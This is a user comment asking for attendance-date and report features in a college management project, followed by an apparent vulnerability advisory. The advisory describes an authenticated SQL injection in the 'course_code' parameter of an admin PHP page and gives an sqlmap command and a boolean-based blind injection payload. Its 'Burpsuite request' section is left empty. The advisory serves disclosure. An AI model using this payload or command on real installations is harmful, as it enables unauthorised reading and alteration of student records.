Hello Sir, you have made a great project. But while marking the attendance of students, there should be a date section where we can select a particular date to mark attendance. Also, there is no report section. If we want to take the attendance report students including all subjects, how can we do this? Please update this project.

# College Management System - 'course\_code' SQL Injection (Authenticated)

1. Description:

---

College Management System 1.0 allows SQL Injection via parameter 'course\_code' in
/College-Management-System/admin/asign-single-student-subjects.php. Exploiting this issue could allow an attacker to compromise
the application, access or modify data, or exploit latent vulnerabilities
in the underlying database.

2. Proof of Concept:

---

In Burpsuite intercept the request from the affected page with
'course\_code' parameter and save it like poc.req. Then run SQLmap to extract the
data from the database:

sqlmap -r poc.req --dbms=mysql

3. Example payload:

---

boolean-based blind
Payload: submit=Press&roll\_no=3&course\_code=-6093' OR 2121=2121 AND 'ddQQ'='ddQQ

4. Burpsuite request:

---
